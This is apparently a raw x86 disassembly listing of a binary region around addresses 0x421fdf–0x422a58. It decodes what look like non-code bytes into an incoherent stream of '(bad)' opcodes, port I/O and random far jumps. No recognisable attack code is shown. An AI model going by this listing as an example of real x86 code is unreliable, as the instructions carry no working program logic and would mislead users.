  421fdf:	mov    ah,0x5c
  421fe1:	outs   dx,DWORD PTR ds:[esi]
  421fe2:	addr16 addr16 inc esp
  421fe5:	xchg   esp,eax
  421fe6:	arpl   WORD PTR [edi],bp
  421fe8:	push   ebx
  421fe9:	xchg   edi,eax
  421fea:	int3   
  421feb:	add    BYTE PTR [edi-0x1d],cl
  421fee:	sub    eax,0x1f66747
  421ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ff4:	dec    ebp
  421ff5:	into   
  421ff6:	scas   eax,DWORD PTR es:[edi]
  421ff7:	or     BYTE PTR [esi],ch
  421ff9:	add    al,0xc8
  421ffb:	(bad)  
  421ffc:	jecxz  0x422042
  421ffe:	adc    BYTE PTR [ebp-0x45],cl
  422001:	lea    ebp,[ebx+0x0]
  422004:	push   edx
  422005:	ja     0x422073
  422007:	repz fs repnz not bl
  42200c:	add    BYTE PTR [ebp-0x1],dh
  42200f:	push   ds
  422010:	imul   eax
  422012:	dec    ebp
  422013:	pop    es
  422014:	xor    dh,dl
  422016:	test   eax,0x3e2a892f
  42201b:	jne    0x422046
  42201d:	sub    esp,DWORD PTR ds:0xc833c313
  422023:	and    bl,BYTE PTR [ecx]
  422025:	and    BYTE PTR [edx],ah
  422027:	mov    edx,0xce8b8680
  42202c:	addr16 stc 
  42202e:	push   0xffffff89
  422030:	jbe    0x42200b
  422032:	or     BYTE PTR [eax+0xa],dh
  422035:	pop    esi
  422036:	push   esi
  422037:	(bad)  
  422038:	jl     0x422036
  42203a:	cwde   
  42203b:	mov    DWORD PTR [esp+ecx*8+0x607ddf71],ecx
  422042:	inc    edi
  422043:	jns    0x422060
  422045:	sbb    BYTE PTR [ebp-0x194a2874],cl
  42204b:	mov    ecx,0xf262b08b
  422050:	push   esp
  422051:	sub    eax,0x1393f2cd
  422056:	nop
  422057:	loopne 0x422020
  422059:	pop    esi
  42205a:	aas    
  42205b:	xor    BYTE PTR [edx],al
  42205d:	scas   eax,DWORD PTR es:[edi]
  42205e:	or     BYTE PTR [edx],bh
  422060:	dec    ecx
  422061:	pop    esi
  422062:	mov    al,ds:0x72a8202f
  422067:	(bad)  
  422068:	sub    eax,0x41329407
  42206d:	sbb    al,0xea
  42206f:	ja     0x422003
  422071:	adc    esi,DWORD PTR [ebx-0x5d]
  422074:	mov    al,0x6b
  422076:	push   ebx
  422077:	mov    dh,0x35
  422079:	xchg   edi,eax
  42207a:	sbb    al,0x59
  42207c:	lea    eax,[edx+0x7eeaa87a]
  422082:	out    dx,al
  422083:	mov    eax,0xd6cff961
  422088:	jecxz  0x422066
  42208a:	or     ebp,DWORD PTR [ebx-0x18d5d91]
  422090:	mov    edx,0xf811cf6e
  422095:	add    eax,0xd76f8a46
  42209a:	je     0x4220c8
  42209c:	repz add BYTE PTR [edi],ah
  42209f:	icebp  
  4220a0:	aaa    
  4220a1:	lds    esi,FWORD PTR [ecx+0x42]
  4220a4:	xor    al,0xe3
  4220a6:	ficom  DWORD PTR [eax]
  4220a8:	sbb    al,0xe
  4220aa:	lds    eax,FWORD PTR [edi+0x2849b812]
  4220b0:	push   esp
  4220b1:	lock ja 0x4220e3
  4220b4:	or     eax,0x0
	...
  422115:	add    BYTE PTR [esi-0x284ae],ah
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0xa75c
  422123:	sahf   
  422124:	adc    BYTE PTR [eax+0x16a0e],dl
  42212a:	pop    es
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [ecx+0x5a40a264],cl
  422133:	jbe    0x422143
  422135:	jne    0x4220f3
  422137:	jno    0x4220c6
  422139:	xor    bh,BYTE PTR [ecx]
  42213b:	lea    ecx,[edi+ebp*2]
  42213e:	or     eax,0xabc8317a
  422143:	adc    ecx,DWORD PTR ds:0x5ee6393d
  422149:	xchg   esi,eax
  42214a:	adc    DWORD PTR [ecx-0x7a50aa79],0x5
  422151:	mov    dl,0xf6
  422153:	mov    esi,0x51162ff0
  422158:	jne    0x422147
  42215a:	fld    TBYTE PTR [ebp+0x4e]
  42215d:	adc    BYTE PTR [edi],bl
  42215f:	sub    DWORD PTR [ebx-0x47e3d02e],eax
  422165:	pop    es
  422166:	or     BYTE PTR [edi],dh
  422168:	and    esi,DWORD PTR gs:[edx+0x29]
  42216c:	out    0xf6,al
  42216e:	lea    esp,[eax+edi*8]
  422171:	test   BYTE PTR [ebx+edi*2-0x4d],bl
  422175:	push   edx
  422176:	or     eax,0xf78b5d23
  42217c:	(bad)  
  42217d:	stc    
  42217e:	inc    esi
  42217f:	lds    eax,FWORD PTR [ebp+0x42]
  422182:	mov    dh,0xd8
  422184:	jae    0x422142
  422186:	and    DWORD PTR [edx-0x7b525b51],0xffffffef
  42218d:	clc    
  42218e:	and    BYTE PTR [edi],ah
  422190:	(bad)  
  422192:	or     eax,0xe760c9ab
  422197:	lods   eax,DWORD PTR ds:[esi]
  422198:	imul   ebx,DWORD PTR [eax],0xaac60b4d
  42219e:	jnp    0x4221d2
  4221a0:	lods   al,BYTE PTR ds:[esi]
  4221a1:	mov    WORD PTR [esi-0x38],ds
  4221a4:	pop    eax
  4221a5:	das    
  4221a6:	sub    DWORD PTR ds:0x57dacd79,ebx
  4221ac:	das    
  4221ad:	in     al,0xdb
  4221af:	ins    DWORD PTR es:[edi],dx
  4221b0:	stc    
  4221b1:	mov    ds:0x5267315d,eax
  4221b6:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4221b8:	test   al,0xc3
  4221ba:	cs dec ecx
  4221bc:	popf   
  4221bd:	jl     0x422180
  4221bf:	jnp    0x4221f9
  4221c1:	jge    0x422191
  4221c3:	ficomp DWORD PTR [ebp-0x7bfc306]
  4221c9:	or     BYTE PTR [edi+0x68],bh
  4221cc:	(bad)  [ebx]
  4221ce:	cmp    DWORD PTR [ebx+0x5398aff0],edx
  4221d4:	stos   BYTE PTR es:[edi],al
  4221d5:	push   0x14
  4221d7:	mov    dh,0xde
  4221d9:	rol    DWORD PTR [edi-0x50b3de0b],1
  4221df:	mov    ecx,?
  4221e1:	mov    dh,0xf4
  4221e3:	fadd   st,st(6)
  4221e5:	stos   BYTE PTR es:[edi],al
  4221e6:	and    DWORD PTR [ebx],ecx
  4221e8:	loopne 0x4221fd
  4221ea:	nop
  4221eb:	cdq    
  4221ec:	call   0x82a58bf0
  4221f1:	add    bh,cl
  4221f3:	xor    al,0xe5
  4221f5:	xor    BYTE PTR [ebx+0x5c786f0e],cl
  4221fb:	retf   
  4221fc:	in     eax,0xd2
  4221fe:	pusha  
  4221ff:	ins    BYTE PTR es:[edi],dx
  422200:	mov    BYTE PTR [ebx+edi*8+0x5a],ch
  422204:	je     0x422225
  422206:	ins    BYTE PTR es:[edi],dx
  422207:	popf   
  422208:	call   0x8dac:0x27c55a65
  42220f:	js     0x4221d9
  422211:	popa   
  422212:	pop    edx
  422213:	test   al,0xff
  422215:	jecxz  0x4221e8
  422217:	into   
  422218:	call   0x16119f7
  42221d:	ror    BYTE PTR [esi],0x6c
  422220:	jns    0x4221b7
  422222:	push   esi
  422223:	xchg   DWORD PTR [ecx-0x7e209799],eax
  422229:	lods   eax,DWORD PTR ds:[esi]
  42222a:	pop    eax
  42222b:	mov    edi,0x2afe67a2
  422230:	pop    ss
  422231:	mov    ebp,0x4f4ab8
	...
  422296:	(bad)  
  422297:	in     eax,dx
  422298:	lods   eax,DWORD PTR ds:[esi]
  422299:	imul   edi
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    edx,DWORD PTR [edx]
  4222a3:	pop    WORD PTR ds:0x16b15
  4222aa:	pop    es
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    BYTE PTR [ecx-0x789191da],bl
  4222b3:	jmp    0x4222d7
  4222b5:	jecxz  0x422278
  4222b7:	add    edx,esi
  4222b9:	(bad)
  4222bc:	adc    edx,ecx
  4222be:	shr    edi,1
  4222c0:	pop    ss
  4222c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222c2:	mov    edx,?
  4222c4:	cmp    eax,0x7eaf5352
  4222c9:	sahf   
  4222ca:	shl    bh,1
  4222cc:	retf   
  4222cd:	shl    DWORD PTR [ebp+0x5fb160e4],0x55
  4222d4:	fldenv [ecx]
  4222d6:	test   BYTE PTR [edx],cl
  4222d8:	push   es
  4222d9:	pusha  
  4222da:	mov    ecx,0x43d89b10
  4222df:	or     BYTE PTR [ebx-0x1ddd3aab],dh
  4222e5:	jne    0x42233d
  4222e7:	arpl   WORD PTR [ebx],di
  4222e9:	out    0x6a,al
  4222eb:	sbb    ah,BYTE PTR [ebx-0x36a74206]
  4222f1:	out    0x4e,al
  4222f3:	inc    esp
  4222f4:	(bad)  
  4222f5:	fcmovu st,st(5)
  4222f7:	jae    0x4222f3
  4222f9:	add    BYTE PTR [edx],ah
  4222fb:	sub    BYTE PTR [edx-0x31],dl
  4222fe:	adc    eax,0xf9695b16
  422303:	push   esi
  422304:	fwait
  422305:	mov    ch,0xab
  422307:	adc    BYTE PTR [ebx],cl
  422309:	mov    ds:0xbb5e9484,al
  42230e:	jmp    0x422367
  422310:	sub    eax,0xacb6ce50
  422315:	int3   
  422316:	repnz mov bh,0x64
  422319:	or     edx,DWORD PTR [ecx-0x5d321a3c]
  42231f:	cli    
  422320:	pop    ds
  422321:	mov    ebx,0x7f0e7247
  422326:	pop    esi
  422327:	dec    eax
  422328:	xchg   edi,eax
  422329:	adc    eax,0x6177c3a3
  42232e:	loope  0x422365
  422330:	into   
  422331:	les    esp,FWORD PTR [ebp+edx*8-0x61]
  422335:	aad    0x89
  422337:	mov    bl,0x20
  422339:	and    al,0x3d
  42233b:	test   BYTE PTR [ebp+0x61],0x1e
  42233f:	dec    edi
  422340:	fidivr WORD PTR [ebx+ecx*4]
  422343:	es cmp eax,0x6a70290c
  422349:	hlt    
  42234a:	add    al,0x80
  42234c:	(bad)  
  42234d:	or     al,0x71
  42234f:	js     0x42239a
  422351:	xor    ah,BYTE PTR [ebx]
  422353:	scas   eax,DWORD PTR es:[edi]
  422354:	jg     0x42231b
  422356:	pop    edi
  422357:	xchg   ecx,eax
  422358:	sbb    DWORD PTR [ebp+0x6224bae0],0x7c
  42235f:	mov    esp,0xac27cfd7
  422364:	sub    al,0xf9
  422366:	out    dx,eax
  422367:	dec    ebx
  422368:	ins    BYTE PTR es:[edi],dx
  422369:	or     eax,0x45300dd7
  42236e:	jnp    0x4223e1
  422370:	hlt    
  422371:	push   cs
  422372:	sbb    BYTE PTR [ecx+0x0],ch
  422375:	mov    ch,0xa1
  422377:	jp     0x4223c0
  422379:	mov    ecx,0xa96521bf
  42237e:	ss out 0xb7,eax
  422381:	bound  esp,QWORD PTR [ebp+ebx*2+0x39db8c63]
  422388:	inc    DWORD PTR [esi+eax*2]
  42238b:	test   eax,0xae819198
  422390:	(bad)  [edi-0x36]
  422393:	dec    esi
  422394:	jae    0x4223fc
  422396:	out    dx,eax
  422397:	ins    BYTE PTR es:[edi],dx
  422398:	sbb    ebx,DWORD PTR [ebx-0x343aa96e]
  42239e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42239f:	adc    DWORD PTR [ecx],eax
  4223a1:	dec    ebp
  4223a2:	in     al,0x50
  4223a4:	cmp    ebp,DWORD PTR [ecx]
  4223a6:	cwde   
  4223a7:	dec    edx
  4223a8:	pop    ds
  4223a9:	add    edx,DWORD PTR [ebx+edi*4-0x6fb1ae02]
  4223b0:	push   edi
  4223b1:	add    ax,0xc594
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0x7dc965b6
  422424:	stos   BYTE PTR es:[edi],al
  422425:	jmp    0x107:0x16c1c
  42242c:	add    BYTE PTR [eax],al
  42242e:	inc    ebp
  42242f:	shl    BYTE PTR [edi],1
  422431:	mov    ch,0x2f
  422433:	int3   
  422434:	cmp    eax,0xda99777
  422439:	and    eax,0xf61409de
  42243e:	jnp    0x422445
  422440:	out    dx,al
  422441:	dec    edx
  422442:	mov    cl,0x47
  422444:	inc    ecx
  422445:	mov    ebx,0x6b5d14
  42244a:	and    al,0x95
  42244c:	fidiv  WORD PTR [edi+0x17]
  42244f:	sbb    al,0xf8
  422451:	pop    ss
  422452:	loope  0x4223f5
  422454:	and    al,0xd
  422456:	out    dx,al
  422457:	pop    es
  422458:	dec    edi
  422459:	pop    ds
  42245a:	ret    0xd27e
  42245d:	inc    ecx
  42245e:	shl    DWORD PTR [eax+0x7b],0xa1
  422462:	sahf   
  422463:	sbb    edi,DWORD PTR [eax]
  422465:	push   edx
  422466:	sbb    eax,0xc2ea2a9e
  42246b:	push   es
  42246c:	shr    BYTE PTR [ebp-0x50],1
  42246f:	xchg   al,bl
  422471:	jle    0x422418
  422473:	dec    esi
  422474:	mov    ebx,0x1594823a
  422479:	jl     0x42243a
  42247b:	popa   
  42247c:	(bad)  
  42247d:	addr16 cmc 
  42247f:	add    BYTE PTR [edx+ebp*8],dh
  422482:	pop    ds
  422483:	cdq    
  422484:	rcr    BYTE PTR [esi],0x25
  422487:	(bad)  
  422489:	pushf  
  42248a:	outs   dx,BYTE PTR ds:[esi]
  42248b:	sbb    dl,BYTE PTR [eax+0x70cc9a68]
  422491:	out    dx,eax
  422492:	push   edi
  422493:	push   ebp
  422494:	rol    BYTE PTR [ebx+0x4411461],1
  42249a:	xchg   DWORD PTR [esi-0x14a17329],esp
  4224a0:	test   DWORD PTR [eax],edx
  4224a2:	pop    ebp
  4224a3:	pop    esi
  4224a4:	sbb    BYTE PTR [ecx-0xb],bh
  4224a7:	cli    
  4224a8:	inc    edx
  4224a9:	inc    ecx
  4224aa:	jge    0x4224ff
  4224ac:	call   0xe116:0xa1020a3f
  4224b3:	leave  
  4224b4:	rol    esi,0xc
  4224b7:	push   ecx
  4224b8:	cmp    bh,cl
  4224ba:	mov    esp,0x2fad239e
  4224bf:	out    0x88,al
  4224c1:	pop    eax
  4224c2:	jne    0x422539
  4224c4:	lods   eax,DWORD PTR ds:[esi]
  4224c5:	xchg   esi,eax
  4224c6:	and    eax,0x74457ab4
  4224cb:	out    dx,al
  4224cc:	(bad)  
  4224cd:	in     al,dx
  4224ce:	pop    edx
  4224cf:	jp     0x42251d
  4224d1:	into   
  4224d2:	push   ecx
  4224d3:	sub    ah,cl
  4224d5:	lock mov ch,0xf0
  4224d8:	sub    DWORD PTR [ebp-0x36ac3ded],0x78f201bf
  4224e2:	jno    0x422475
  4224e4:	mov    ecx,0x839fc080
  4224e9:	gs pop ds
  4224eb:	mov    DWORD PTR [edi+0x42],ecx
  4224ee:	push   cs
  4224ef:	mov    dh,0x50
  4224f1:	retf   
  4224f2:	xor    al,0xb1
  4224f4:	jnp    0x42251a
  4224f6:	mov    eax,ds:0xb16bac70
  4224fb:	ins    BYTE PTR es:[edi],dx
  4224fc:	jp     0x422529
  4224fe:	call   DWORD PTR [edi]
  422500:	rcr    al,1
  422502:	push   0xffffff82
  422504:	jmp    0x42249c
  422506:	sbb    eax,0x7e53d7f6
  42250b:	xchg   esp,eax
  42250c:	ret    0x49c5
  42250f:	sbb    ax,0xa874
  422513:	cs mov ebx,0x2212a8c4
  422519:	sub    eax,DWORD PTR [edi+0x7e]
  42251c:	repz (bad) 
  42251e:	shl    dh,cl
  422520:	imul   DWORD PTR [ebp+0x668ec8e2]
  422526:	mov    dh,0xfd
  422528:	mov    al,0x8
  42252a:	fwait
  42252b:	cli    
  42252c:	test   eax,0x6dfbb57
  422531:	mov    bh,0x97
  422533:	and    al,0x83
	...
  422595:	add    BYTE PTR [edx-0x40887052],bl
  42259b:	ja     0x422597
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fcom   DWORD PTR ds:0x238c3f32
  4225a7:	ins    DWORD PTR es:[edi],dx
  4225a8:	add    DWORD PTR [eax],eax
  4225aa:	pop    es
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [edi+0x2c],cl
  4225b0:	ficomp DWORD PTR [edi-0x76375a3]
  4225b6:	lods   eax,DWORD PTR ds:[esi]
  4225b7:	inc    esp
  4225b8:	mov    ebp,0x4929601d
  4225bd:	(bad)  
  4225be:	in     eax,dx
  4225bf:	push   ebx
  4225c0:	sub    dl,ch
  4225c2:	fstp   QWORD PTR [edi-0x61edcae7]
  4225c8:	push   ecx
  4225c9:	ret    
  4225ca:	repz bound edx,QWORD PTR [edi]
  4225cd:	lods   eax,DWORD PTR ds:[esi]
  4225ce:	ins    BYTE PTR es:[edi],dx
  4225cf:	adc    DWORD PTR [ecx],0x6f301b0a
  4225d5:	add    eax,0x84ce98c4
  4225da:	mov    ah,0x68
  4225dc:	jmp    0x4225d8
  4225de:	push   ebx
  4225df:	push   ds
  4225e0:	xchg   esp,eax
  4225e1:	xchg   BYTE PTR [edx-0x2bc185ec],bh
  4225e7:	nop
  4225e8:	jbe    0x422652
  4225ea:	or     edi,0xb643fb28
  4225f0:	std    
  4225f1:	add    eax,0xf22583e9
  4225f6:	dec    dl
  4225f8:	cmc    
  4225f9:	sbb    ebx,ebx
  4225fb:	les    ecx,FWORD PTR [eax+eiz*1-0x55]
  4225ff:	cdq    
  422600:	push   ebp
  422601:	out    0xda,al
  422603:	rcr    BYTE PTR [ebp-0x1f],cl
  422606:	sub    cl,ch
  422608:	or     BYTE PTR [ebp-0xab28bed],bl
  42260e:	jg     0x422646
  422610:	outs   dx,DWORD PTR ds:[esi]
  422611:	mov    ch,0xcb
  422613:	xlat   BYTE PTR ds:[ebx]
  422614:	and    eax,0x905c9ac0
  422619:	push   ebx
  42261a:	jnp    0x4225ec
  42261c:	lods   al,BYTE PTR ds:[esi]
  42261d:	push   edx
  42261e:	cmc    
  42261f:	xor    cl,dh
  422621:	add    ah,BYTE PTR [edi+0x24]
  422624:	jo     0x422628
  422626:	mov    bh,0x4d
  422628:	stos   DWORD PTR es:[edi],eax
  422629:	cs xchg ebp,eax
  42262b:	fild   QWORD PTR [ebx]
  42262d:	mov    bl,0xf1
  42262f:	(bad)  
  422630:	sub    ecx,DWORD PTR [edx-0x727c2ceb]
  422636:	mov    edx,0x7ef1b779
  42263b:	cmp    edi,DWORD PTR [ebp+0xbe1d76c]
  422641:	jbe    0x4225f3
  422643:	push   edx
  422644:	in     eax,dx
  422645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422646:	inc    edx
  422647:	not    BYTE PTR [ebx]
  422649:	push   eax
  42264a:	pop    edx
  42264b:	out    0x70,eax
  42264d:	sti    
  42264e:	adc    ebp,ebp
  422650:	push   ds
  422651:	inc    ecx
  422652:	js     0x4225ff
  422654:	xor    eax,0xae5f2fec
  422659:	add    esp,DWORD PTR [esi]
  42265b:	add    eax,0x721ef0a3
  422660:	shl    eax,cl
  422662:	xchg   esi,eax
  422663:	rol    BYTE PTR [ecx+0xe644526],cl
  422669:	mov    WORD PTR [ebp-0x5438b7ce],?
  42266f:	inc    ebx
  422670:	retf   0xafa1
  422673:	popf   
  422674:	sar    DWORD PTR [ecx-0x3d],cl
  422677:	adc    DWORD PTR [ebx+0x30ac0ecc],edi
  42267d:	xchg   esi,eax
  42267e:	js     0x4226d1
  422680:	mov    BYTE PTR [ebx-0x63668389],ch
  422686:	aaa    
  422687:	test   DWORD PTR [eax+0x13bf2a4a],esp
  42268d:	ret    0x5720
  422690:	(bad)  
  422691:	aad    0x4c
  422693:	or     bh,BYTE PTR [eax+0x1ee47d2]
  422699:	clc    
  42269a:	test   eax,0x152e70a8
  42269f:	rcr    DWORD PTR [edi-0x42],1
  4226a2:	leave  
  4226a3:	mov    es,WORD PTR [esi+0x52dc069b]
  4226a9:	jmp    0x422653
  4226ab:	retf   
  4226ac:	pushf  
  4226ad:	mov    al,ds:0x6939386
  4226b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226b3:	push   ecx
  4226b4:	dec    ebp
	...
  422715:	add    BYTE PTR [edi],ah
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	add    bl,ch
  422724:	adc    cl,BYTE PTR [ebx+0x16e2a]
  42272a:	pop    es
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR [ebp-0x35],bh
  422730:	sub    al,0xe0
  422732:	adc    eax,edi
  422734:	(bad)  
  422735:	mov    eax,0xcfb57c6d
  42273a:	mov    ebx,eax
  42273c:	mov    BYTE PTR [edi],dh
  42273e:	mov    dh,0x37
  422740:	jp     0x42279a
  422742:	dec    ebx
  422743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422744:	xchg   ebp,eax
  422745:	arpl   WORD PTR [esi],bx
  422747:	xchg   esp,eax
  422748:	leave  
  422749:	arpl   WORD PTR [ebp-0x1a4e0b06],di
  42274f:	cmovle ebx,edi
  422752:	xrelease xchg DWORD PTR [ecx],edx
  422755:	and    BYTE PTR [ebp-0x333e1981],dl
  42275b:	lds    ebx,FWORD PTR [esi-0x3e]
  42275e:	and    ebp,DWORD PTR [ebx+0x5c]
  422761:	inc    edx
  422762:	retf   
  422763:	dec    ebx
  422764:	mov    esi,0x7cbf0332
  422769:	(bad)  
  42276a:	fsub   DWORD PTR [esi-0x5af4ca22]
  422770:	out    0xe3,eax
  422772:	ret    0x3a37
  422775:	fdivr  DWORD PTR [ecx-0x4c]
  422778:	in     eax,dx
  422779:	inc    eax
  42277a:	push   edx
  42277b:	adc    eax,0xa6c05b6d
  422780:	stc    
  422781:	leave  
  422782:	jbe    0x4227b9
  422784:	test   BYTE PTR [ebp-0x59d58d4c],bh
  42278a:	mov    esi,0x3e494faf
  42278f:	or     DWORD PTR [eax-0x12076a],0xffffffb6
  422796:	and    ecx,DWORD PTR [edx-0x1d]
  422799:	lods   eax,DWORD PTR ds:[esi]
  42279a:	in     al,0xf5
  42279c:	ror    DWORD PTR [edx],cl
  42279e:	fmul   st(7),st
  4227a0:	inc    ecx
  4227a1:	adc    eax,0x2e62eb92
  4227a6:	outs   dx,BYTE PTR ds:[esi]
  4227a7:	mov    ah,BYTE PTR [edx-0x44]
  4227aa:	and    DWORD PTR [ecx-0x65],ebp
  4227ad:	in     al,0xe8
  4227af:	jg     0x422821
  4227b1:	jae    0x42276a
  4227b3:	cdq    
  4227b4:	and    BYTE PTR [ebx-0x7],ah
  4227b7:	adc    DWORD PTR ds:[ebp-0x69],0x83c428d9
  4227bf:	jns    0x422773
  4227c1:	sbb    DWORD PTR [esp+edi*4],0xffffffcb
  4227c5:	or     al,0x82
  4227c7:	inc    eax
  4227c8:	enter  0x29b7,0x2c
  4227cc:	pop    ds
  4227cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ce:	dec    esp
  4227cf:	mul    DWORD PTR [esi-0x4d]
  4227d2:	fwait
  4227d3:	push   esp
  4227d4:	mov    dh,0x3b
  4227d6:	ja     0x4227ef
  4227d8:	dec    ebp
  4227d9:	fwait
  4227da:	inc    eax
  4227db:	cmp    eax,0x3045fd2
  4227e0:	das    
  4227e1:	inc    eax
  4227e2:	mov    bl,0x6b
  4227e4:	pusha  
  4227e5:	xchg   ecx,eax
  4227e6:	mov    fs,WORD PTR [ebx-0x4751c479]
  4227ec:	jecxz  0x4227f1
  4227ee:	call   0x2e9d9b75
  4227f3:	mov    al,ds:0xaab11d9f
  4227f8:	inc    ecx
  4227f9:	(bad)  
  4227fb:	addr16 jmp 0x44b7:0x299c560d
  422803:	cmp    DWORD PTR [edi],edi
  422805:	es mov al,0xf3
  422808:	mov    edi,ecx
  42280a:	mov    BYTE PTR [eax+edx*2+0x5f0a2696],cl
  422811:	cdq    
  422812:	mov    bl,0x7
  422814:	xchg   ebp,eax
  422815:	xchg   esp,eax
  422816:	push   cs
  422817:	mov    ch,BYTE PTR [esi+0x77c2f5ff]
  42281d:	jbe    0x4227ab
  42281f:	repz mov bl,0x62
  422822:	add    BYTE PTR [esi-0x5f60cd65],dh
  422828:	or     eax,DWORD PTR [edi+0x90a382d]
  42282e:	out    dx,al
  42282f:	test   esp,ebx
  422831:	cmp    edx,DWORD PTR [ecx+0x43]
  422834:	arpl   WORD PTR [eax],ax
	...
  422896:	int    0x39
  422898:	mov    eax,0xef97fc97
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [esi+edx*2]
  4228a3:	and    BYTE PTR [edx],0x32
  4228a6:	xor    DWORD PTR [edi+0x1],ebp
  4228a9:	add    BYTE PTR [edi],al
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR ds:0x14f3d1f6,bl
  4228b3:	fs loope 0x422909
  4228b6:	or     al,0xd
  4228b8:	stc    
  4228b9:	test   ah,ch
  4228bb:	loopne 0x422875
  4228bd:	(bad)  
  4228be:	mov    cl,0x9f
  4228c0:	mov    ds:0x67075c08,al
  4228c5:	pop    ebp
  4228c6:	ds jne 0x422900
  4228c9:	mov    ds:0xa2710261,eax
  4228ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228cf:	or     al,0x21
  4228d1:	push   cs
  4228d2:	inc    esi
  4228d3:	xchg   BYTE PTR [eax+0x33],dh
  4228d6:	repnz stos BYTE PTR es:[edi],al
  4228d8:	ja     0x4228dc
  4228da:	cmp    DWORD PTR [edi+0x4b6a6463],eax
  4228e0:	jmp    0x4228ab
  4228e2:	jmp    0x4228ff
  4228e4:	adc    ebp,DWORD PTR [edi+0x30c19c54]
  4228ea:	sub    eax,0x2e84bcc6
  4228ef:	ret    0xb54a
  4228f2:	adc    eax,0xd80a489f
  4228f7:	mov    eax,0x910cae68
  4228fc:	mov    ch,0xc6
  4228fe:	aad    0x87
  422900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422901:	mov    edx,0xe0b9c9f1
  422906:	add    al,0x97
  422908:	div    esi
  42290a:	inc    edi
  42290b:	mov    ecx,DWORD PTR [eax-0x2fb78a27]
  422911:	mov    edx,0xb5df1721
  422916:	xchg   ebx,eax
  422917:	nop
  422918:	not    BYTE PTR [edx]
  42291a:	pop    esp
  42291b:	mov    eax,ds:0x46e6a006
  422920:	cs pusha 
  422922:	inc    edi
  422923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422924:	pop    esi
  422925:	fimul  DWORD PTR [ecx-0x5c5fdba2]
  42292b:	retf   
  42292c:	test   eax,0xbc813471
  422931:	stos   DWORD PTR es:[edi],eax
  422932:	cmp    dh,BYTE PTR [esi]
  422934:	push   eax
  422935:	jl     0x42299d
  422937:	and    bh,cl
  422939:	sbb    eax,0x148051fa
  42293e:	mov    esp,0x8bcd6664
  422943:	lds    edi,FWORD PTR [edi+0x30]
  422946:	xor    al,0x6
  422948:	jo     0x42296d
  42294a:	xchg   esp,eax
  42294b:	(bad)  
  42294c:	dec    edx
  42294d:	jns    0x422925
  42294f:	js     0x422959
  422951:	fadd   st(2),st
  422953:	mov    eax,DWORD PTR [ebx]
  422955:	add    edx,eax
  422957:	inc    ecx
  422958:	jp     0x42295f
  42295a:	(bad)  
  42295b:	inc    ecx
  42295c:	mov    DWORD PTR [ebp+0x4],edi
  42295f:	mov    dl,0x90
  422961:	(bad)  
  422962:	adc    DWORD PTR ds:0xbb6b94fd,esp
  422968:	push   es
  422969:	ror    ebx,cl
  42296b:	mov    cl,0x57
  42296d:	jmp    0xfe68:0xfb086303
  422974:	xlat   BYTE PTR ds:[ebx]
  422975:	jmp    0x422907
  422977:	inc    esp
  422978:	mov    cl,0x58
  42297a:	or     eax,0x684553ce
  42297f:	and    edx,DWORD PTR [edx-0x27]
  422982:	mov    ?,WORD PTR [ebx*2-0x715efef3]
  422989:	mov    edx,DWORD PTR [edx+0x4b]
  42298c:	pusha  
  42298d:	iret   
  42298e:	inc    ebx
  42298f:	mov    eax,0x3fa1b305
  422994:	(bad)  
  422995:	cmp    BYTE PTR [eax],bl
  422997:	daa    
  422998:	(bad)
  42299b:	and    ch,0xf5
  42299e:	pop    edx
  42299f:	les    esi,FWORD PTR [ebp-0x34]
  4229a2:	jle    0x422a0e
  4229a4:	daa    
  4229a5:	in     al,dx
  4229a6:	xor    eax,0xcc9d6084
  4229ab:	jp     0x4229f2
  4229ad:	es jns 0x422a13
  4229b0:	jnp    0x422a08
  4229b2:	sub    al,0x59
  4229b4:	jo     0x4229b6
	...
  422a16:	xchg   esi,eax
  422a17:	push   0x18
  422a19:	mov    ah,bh
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0x3a87fcda
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    cl,ah
  422a2f:	(bad)  
  422a30:	dec    esp
  422a31:	(bad)  
  422a32:	call   0x61ec:0x10ec7845
  422a39:	xor    bh,al
  422a3b:	gs loopne 0x422ab6
  422a3e:	jnp    0x422a02
  422a40:	pop    ds
  422a41:	out    dx,eax
  422a42:	imul   eax,DWORD PTR [edx-0x7],0x22
  422a46:	xor    BYTE PTR [eax],0x26
  422a49:	repz push edx
  422a4b:	pop    es
  422a4c:	sub    al,0x76
  422a4e:	jmp    0x422a3e
  422a50:	cmp    ah,BYTE PTR [ebx]
  422a52:	sti    
  422a53:	dec    esi
  422a54:	push   edx
  422a55:	js     0x422a61
  422a57:	push   ebx
  422a58:	mov    ebx,0xc57397e
